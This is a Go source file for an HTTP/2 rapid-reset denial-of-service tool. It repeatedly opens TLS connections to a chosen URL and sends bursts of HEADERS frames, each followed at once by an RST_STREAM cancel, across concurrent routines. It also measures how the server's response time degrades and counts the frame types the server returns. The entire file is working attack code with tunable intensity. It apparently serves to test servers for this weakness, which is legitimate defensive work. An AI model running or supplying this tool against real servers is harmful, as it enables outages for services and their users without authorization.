package main

import (
	"bytes"
	"crypto/tls"
	"encoding/csv"
	"flag"
	"fmt"
	"log"
	"math"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
const (
	UNKNOWN = iota
	GOAWAY
	ERR
)

type ResultData struct {
	Headers      uint32
	GoAway       uint32
	Data         uint32
	Settings     uint32
	WindowUpdate uint32
	Ping         uint32
	Unknown      uint32
	RSTStream    uint32
}

type ReadFrameResult struct {
	ResultData
	Err  int
	Conn uint
}

type ReadFrameSummary struct {
	ResultData
	GoAwayEvents  uint32
	TimeoutEvents uint32
	ErrorEvents   uint32
}

func (rd *ResultData) Add(data ResultData) {
	rd.Headers += data.Headers
	rd.GoAway += data.GoAway
	rd.Data += data.Data
	rd.Settings += data.Settings
	rd.WindowUpdate += data.WindowUpdate
	rd.Ping += data.Ping
	rd.Unknown += data.Unknown
	rd.RSTStream += data.RSTStream
}

func (rfr *ReadFrameResult) Add(result ReadFrameResult) {
	rfr.ResultData.Add(result.ResultData)
	if result.Err != UNKNOWN {
		rfr.Err = result.Err
	}
}

func (rfs *ReadFrameSummary) Add(rfr ReadFrameResult) {
	var errs [3]uint32
	errs[rfr.Err] = 1
	rfs.ResultData.Add(rfr.ResultData)

	rfs.TimeoutEvents = errs[0] + rfs.TimeoutEvents
	rfs.GoAwayEvents = errs[1] + rfs.GoAwayEvents
	rfs.ErrorEvents = errs[2] + rfs.ErrorEvents
}

var flows = flag.Uint("frames", 1, "maximum attempts per routine")
var sleep = flag.Uint("delay", 1, "delay between sending HEADERS and RST_STREAM frames")
var ignoreGoAway = flag.Bool("ignoreGoAway", false, "ignore GOAWAY frames sent by the server")
var serverUrl = flag.String("url", "https://localhost:443/", "the server to attack")
var skipVerify = flag.Bool("skipValidation", true, "skip certificate verifcation")
var routines = flag.Uint("routines", 1, "number of concurrent streams to attack")
var connections = flag.Uint("connections", 1, "number of consecutive connections to open")
var monitorDelay = flag.Uint("monitorDelay", 100, "delay between connection monitoring attempts")
var monitoringEnabled = flag.Bool("monitor", false, "enable performance monitoring")
var monitorLogPath = flag.String("monitorLog", "monitor.log", "path to performance monitor logfile")
var connectAttempts = flag.Uint("connectAttempts", 1, "number of consecutive connections to run the test on (per connect-routine)")
var consecutiveSends = flag.Uint("consecutiveSends", 1, "number of HEADERS frames to send before sending RST_STREAM frames (per attempt)")

func createHeaderFrameParam(url *url.URL, streamId uint32) http2.HeadersFrameParam {
	var headerBlock bytes.Buffer

	// Encode headers
	encoder := hpack.NewEncoder(&headerBlock)

	encoder.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
	encoder.WriteField(hpack.HeaderField{Name: ":path", Value: url.Path})
	encoder.WriteField(hpack.HeaderField{Name: ":scheme", Value: "https"})
	encoder.WriteField(hpack.HeaderField{Name: ":authority", Value: url.Host})

	return http2.HeadersFrameParam{
		StreamID:      streamId,
		BlockFragment: headerBlock.Bytes(),
		EndStream:     true,
		EndHeaders:    true,
	}
}

func monitor(client *http.Client) (measurement time.Duration, err error) {
	start := time.Now()
	_, err = client.Head(*serverUrl)
	if err != nil {
		log.Printf("monitor request failed: %v", err)
	}
	end := time.Now()
	measurement = end.Sub(start)
	
	log.Printf("HEAD request took %v", measurement)

	return measurement, err
}

func monitorPerformance(ch chan <- time.Duration, doneFlag *bool) {
	f, err := os.Create(*monitorLogPath)
	if err != nil {
		log.Fatalf("failed opening logfile: %v", err)
	}

	csvWriter := csv.NewWriter(f)
	csvWriter.Comma=';'
	tr := &http2.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	avg := 0.0
	var total int64
	var i int64 = 1
	timeout := time.Duration(*monitorDelay) * time.Millisecond
	for !*doneFlag {
		time.Sleep(timeout)
		val, err := monitor(client)
		if err != nil {
			log.Printf("ERROR DURING MONITORING: %v", err)
			continue
		}
		total += val.Milliseconds()
		avg = float64(total) / float64(i + 1)
		i++
		csvWriter.Write([]string{time.Now().Format(time.RFC3339Nano), strconv.FormatFloat(float64(val.Nanoseconds()) / 1000000.0, 'E', -1, 64)})	
	}
	csvWriter.Flush()
	ch <- time.Duration(avg) * time.Millisecond
}

func main() {
	flag.Parse()
	serverUrl, err := url.Parse(*serverUrl)
	if err != nil {
		log.Fatalf("invalid server url: %v", err)
	}

	if *flows == 0 || *consecutiveSends == 0 || *routines == 0 {
		log.Printf("frames (with value %d), consecutiveSends (with value %d) or routines (with value %d) was 0.\n\t\tNo attack can be performed using this configuration.", 
			*flows, *consecutiveSends, *routines)
		os.Exit(0)
	}

	*flows = uint(math.Ceil(float64(*flows) / float64(*consecutiveSends) / float64(*routines)))
	log.Printf("each routine will send execute %d flows, sending %d HEADERS frames consecutively on %d routines", *flows, *consecutiveSends, *routines)

	conf := &tls.Config{
		InsecureSkipVerify: *skipVerify,
		NextProtos:         []string{"h2"},
	}

	done := false

	monitorCh := make(chan time.Duration)
	if *monitoringEnabled {
		go monitorPerformance(monitorCh, &done)
	}
	time.Sleep(time.Duration(3) * time.Second)
	ch := make(chan ReadFrameResult, *connections)
	wg := &sync.WaitGroup{}
	for i := uint(0); i < *connections; i++ {
		log.Printf("create connection %d", i)
		wg.Add(1)
		go execute(serverUrl, conf, ch, i, wg)
	}

	wg.Wait()
	time.Sleep(time.Duration(3) * time.Second)
	done = true

	if *monitoringEnabled {
		avg := <- monitorCh
		log.Printf("average HTTP/1 response time: %v", avg)
	}
	summarize(ch)
}

func summarize(ch <-chan ReadFrameResult) {
	var summary ReadFrameSummary
	for i := uint(0); i < *connections; i++ {
		rfr := <-ch
		fmt.Printf("got result on conn %v\n", rfr.Conn)
		defer printResult(rfr) //this is deferred purely for formatting reasons - i might have to use a sync.WaitGroup here, but this will work for now.
		summary.Add(rfr)
	}
	fmt.Println(strings.Repeat("\n", 10) + strings.Repeat("#", 20) + "SUMMARY" + strings.Repeat("#", 20))
	fmt.Println("Packet types received:")
	fmt.Printf("\tPING: %d\n", summary.Ping)
	fmt.Printf("\tHEADERS: %d\n", summary.Headers)
	fmt.Printf("\tSETTINGS: %d\n", summary.Settings)
	fmt.Printf("\tDATA: %d\n", summary.Data)
	fmt.Printf("\tGOAWAY: %d\n", summary.GoAway)
	fmt.Printf("\tRSTSTREAM: %d\n", summary.RSTStream)
	fmt.Printf("\tWINDOWUPDATE: %d\n", summary.WindowUpdate)
	fmt.Printf("\tUNKNOWN: %d\n", summary.Unknown)
	fmt.Println("Attack ending reasons (per receiving thread):")
	fmt.Printf("\tGoAway events: %d\n", summary.GoAwayEvents)
	fmt.Printf("\tTimeout events: %d\n", summary.TimeoutEvents)
	fmt.Printf("\tError events: %d\n", summary.ErrorEvents)
}

func printResult(result ReadFrameResult) {
	fmt.Printf("Summary for connection %d\n", result.Conn)
	fmt.Printf("\tPING: %d\n", result.Ping)
	fmt.Printf("\tHEADERS: %d\n", result.Headers)
	fmt.Printf("\tSETTINGS: %d\n", result.Settings)
	fmt.Printf("\tDATA: %d\n", result.Data)
	fmt.Printf("\tGOAWAY: %d\n", result.GoAway)
	fmt.Printf("\tRSTSTREAM: %d\n", result.RSTStream)
	fmt.Printf("\tWINDOWUPDATE: %d\n", result.WindowUpdate)
	fmt.Printf("\tUNKNOWN: %d\n", result.Unknown)

	var reason string
	switch result.Err {
	case UNKNOWN:
		reason = "Unknown"
	case GOAWAY:
		reason = "GoAway - the server responded as expected."
	case ERR:
		reason = "Error - we found some kind of error while evaluating the received packets"
	default:
		reason = "Unexpected result"
	}
	fmt.Printf("\tReason for stopping to listen for more packets: %s\n", reason)
}

func connectAndAttack(serverUrl *url.URL, conf *tls.Config, connId uint) ReadFrameResult {
	conn, err := tls.Dial("tcp", serverUrl.Host, conf)
	if err != nil {
		log.Fatalf("error establishing connection to %s: %v", serverUrl.Host, err)
	}

	prefaceBytes := []byte(PREFACE)
	length, err := conn.Write(prefaceBytes)
	if err != nil || length != len(prefaceBytes) {
		log.Fatalf("error sending HTTP2 preface data. Sent %d bytes of %d: %v", length, len(prefaceBytes), err)
	}

	framer := http2.NewFramer(conn, conn)
	err = framer.WriteSettings()
	if err != nil {
		log.Fatalf("failed writing SETTINGS frame: %v (%v)", err, framer.ErrorDetail())
	}

	for {
		frame, err := framer.ReadFrame()
		if err != nil {
			log.Fatalf("failed reading frame: %v (%v)", err, framer.ErrorDetail())
		}

		if frame.Header().Type == http2.FrameSettings && frame.Header().Flags == http2.FlagSettingsAck {
			break
		}
	}

	//at this point, the connection is established.

	var streamCounter uint32 = 1
	var lock *sync.Mutex = nil
	if *routines > 1 {
		lock = &sync.Mutex{}
	}
	for i := uint(0); i < *routines; i++ {
		streamFramer := http2.NewFramer(conn, conn) //a framer may only be used by a single reader/writer
		go attack(streamFramer, serverUrl, &streamCounter, lock)
	}

	res := readFrames(conn, connId)
	conn.Close()
	return res
}

func execute(serverUrl *url.URL, conf *tls.Config, ch chan<- ReadFrameResult, connId uint, wg *sync.WaitGroup) {
	var res ReadFrameResult
	for i := uint(0); i < *connectAttempts; i++ {
		//log.Printf("start attack wave %d on connection %d", i, connId)
		r := connectAndAttack(serverUrl, conf, connId)
		res.Add(r)
	}
	ch <- res
	wg.Done()
}

func readFrames(conn *tls.Conn, connId uint) ReadFrameResult {
	framer := http2.NewFramer(conn, conn) //a framer is fairly lightweight and we don't want to interfere with write operations, so let's read frames on a separate one.
	var rfr ReadFrameResult = ReadFrameResult{
		Conn: connId,
	}

	readDuration := 1 * time.Second
	for {
		conn.SetReadDeadline(time.Now().Add(readDuration))
		frame, err := framer.ReadFrame()
		if err != nil {
			log.Printf("error reading response frame: %v", err)
			if rfr.Err == UNKNOWN {
				rfr.Err = ERR
			}
			return rfr
		}

		switch frame.Header().Type {
		case http2.FrameHeaders:
			rfr.Headers++
		case http2.FrameSettings:
			rfr.Settings++
		case http2.FrameData:
			rfr.Data++
		case http2.FrameGoAway:
			rfr.GoAway++
			rfr.Err = GOAWAY
			if !*ignoreGoAway {
				return rfr
			}
		case http2.FramePing:
			rfr.Ping++
		case http2.FrameRSTStream:
			rfr.RSTStream++
		case http2.FrameWindowUpdate:
			rfr.WindowUpdate++
		default:
			rfr.Unknown++
		}
	}
}

func attack(framer *http2.Framer, url *url.URL, streamCounter *uint32, lock *sync.Mutex) {
	opened := make([]uint32, *consecutiveSends)
	hp := createHeaderFrameParam(url, 0)

	for i := uint(0); i < *flows; i++ {
		for j := uint(0); j < *consecutiveSends; j++ {
			if lock != nil {
				lock.Lock()
			}
			hp.StreamID = *streamCounter
			*streamCounter += 2
			err := framer.WriteHeaders(hp)
			if lock != nil {
				lock.Unlock()
			}

			opened[j] = hp.StreamID
			if err != nil {
				log.Printf("[stream %d] unable to send initial HEADERS frame", hp.StreamID)
				return
			}
		}

		for _, v := range(opened) {
			err := framer.WriteRSTStream(v, http2.ErrCodeCancel)
			if err != nil {
				log.Printf("[stream %d] unable to write RST_STREAM frame: %v", v, err)
				return
			}
		}
	}
}
